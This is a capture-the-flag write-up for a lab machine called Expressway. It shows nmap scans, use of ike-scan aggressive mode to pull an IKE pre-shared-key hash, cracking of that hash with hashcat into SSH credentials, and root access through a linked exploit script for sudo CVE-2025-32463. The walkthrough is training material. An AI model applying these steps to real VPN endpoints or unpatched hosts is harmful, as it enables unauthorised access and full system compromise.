#box #isakmp #ike-scan #sudo-vulnerabilities

Expressway is an interesting easy machine that revolves around the presence of a UDP service called ISAKMP that stands for Internet Security Association and Key Management Protocol. Our nmap scan in fact does not discover anything else except for this ISAKMP service while on TCP it only finds SSH. ISAKMP has a vulnerability that we can leverage with a tool called `ike-scan`.  Once obtained the user and the password for the foothold, inside the target machine we discover the machine has a vulnerable sudo version.
## Nmap

### TCP

```bash
# Nmap 7.95 scan initiated Sun Sep 21 09:58:50 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.035s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 21 09:58:52 2025 -- 1 IP address (1 host up) scanned in 2.38 seconds
```

### UDP

```bash
# Nmap 7.95 scan initiated Sun Sep 21 09:58:56 2025 as: /usr/lib/nmap/nmap -sU --top-ports=100 -o nmap_sU 10.10.11.87
Nmap scan report for 10.10.11.87
Host is up (0.051s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

# Nmap done at Sun Sep 21 10:00:51 2025 -- 1 IP address (1 host up) scanned in 114.62 seconds
```

## ISAKMP

We delve into what ISAKMP is, discovering this [link](https://infinitelogins.com/2020/12/08/enumerating-ipsec-ike-isakmp-ports-500-4500-etc/).
ISAKMP stands for Internet Security Association and Key Management Protocol and it's possible to extract the hash or preshared key of the user running it through a tool called `ike-scan`.
Within the following command:

```bash
ike-scan --aggressive 10.10.11.87
```

We obtaining the name of the user running this service:

![[attachments/expressway-writeup-1.png]]

By adding the parameter `-P` to the command:

```bash
ike-scan --aggressive -P 10.10.11.87
```

We also obtain a PSK Hash:

![[attachments/expressway-writeup-2.png]]

We copy that into a file, and we then use `hashcat` to crack it.
According to the scan made we know that the hash is a SHA1, so we'll use `hashcat -m 5400`:

```bash
hashcat -m 5400 psk_hash.txt /usr/share/wordlists/rockyou.txt
```

Obtaining the pair of credentials: `ike:freakingrockstarontheroad`
## Privilege Escalation

With the brand new user we authenticate to SSH:

```bash
ssh ike@expressway.htb
```

and once on the target machine, we discover with `sudo -V` that the current sudo version is `1.9.17`. This sudo version is vulnerable to [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32463).
We then download the following [shell file](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh) and copy it onto the SSH machine with `scp`:

```bash
scp woot.sh ike@expressway.htb:/tmp
```

We then `chmod +x /tmp/woot.sh` and finally execute it, obtaining a root shell:

![[attachments/expressway-writeup-3.png]]